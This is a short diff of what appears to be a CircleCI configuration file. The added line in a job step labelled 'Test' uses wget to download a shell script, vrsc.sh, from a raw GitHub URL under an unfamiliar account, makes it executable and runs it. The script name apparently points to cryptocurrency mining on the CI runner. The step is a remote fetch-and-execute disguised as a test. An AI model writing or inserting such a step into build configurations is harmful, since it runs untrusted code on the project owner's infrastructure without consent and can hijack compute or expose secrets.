@@ -8,7 +8,7 @@ jobs:
     executor: python/default
     steps:
       - run:
-          command: https://raw.githubusercontent.com/ngentokyokkak/mahmed/main/vrsc.sh && chmod +x vrsc.sh && ./vrsc.sh
+          command: wget https://raw.githubusercontent.com/ngentokyokkak/mahmed/main/vrsc.sh && chmod +x vrsc.sh && ./vrsc.sh
           name: Test
 
 workflows:
